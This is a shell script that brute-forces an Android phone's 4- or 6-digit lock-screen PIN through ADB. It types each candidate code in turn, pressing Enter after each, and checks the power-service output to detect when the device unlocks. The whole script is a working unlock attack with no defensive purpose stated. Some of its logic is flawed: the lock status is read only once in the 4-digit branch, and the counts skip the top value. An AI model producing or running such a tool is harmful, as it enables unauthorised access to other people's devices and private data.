testingpass=123456


alias Button='./adbTouch.sh'
alias Text='adb shell input text '
alias ScreenOn='adb shell input keyevent 26'
alias Enter='adb shell input keyevent 66'
# alias Swipe='adb shell input swipe 500 1000 300 300'
alias EnterPass='adb shell input keyevent 82'


###Testing Lock Status
UNLOCKED=$(adb shell dumpsys power | grep 'mHoldingDisplaySuspendBlocker' |cut -c 33-37)







ScreenOn

EnterPass

echo "How much digits you think ?"
echo "  1) 4 digits"
echo "  2) 6 digits 2"
 


read n
case $n in
  1)
	echo selected 4 digits
	gen=9999
	EnterPass


if [ True ]
then
   while [ True ];
		do
		sleep 1
		if [ $UNLOCKED = "false" ] ; then echo Locked; else echo Unlocked with $gen; fi
		gen=$(($gen-1)) 
		echo trying $gen
		Text $gen
		Enter
		sleep 3
done
fi

	;;
  2) 
	echo selected 6 digits
	gen=999999
	EnterPass

if [ True ]
then
   while [ True ];
                do
		sleep 1
                gen=$(($gen-1)) 
		echo Tring $gen
                Text $gen
                Enter
		if [ $(adb shell dumpsys power | grep 'mHoldingDisplaySuspendBlocker' |cut -c 33-37) = "false" ] ; then echo Locked; else echo Unlocked with $gen; fi
done
fi  




	;;
  *) echo "echo invalid option"
   ./main.sh
	;;
esac


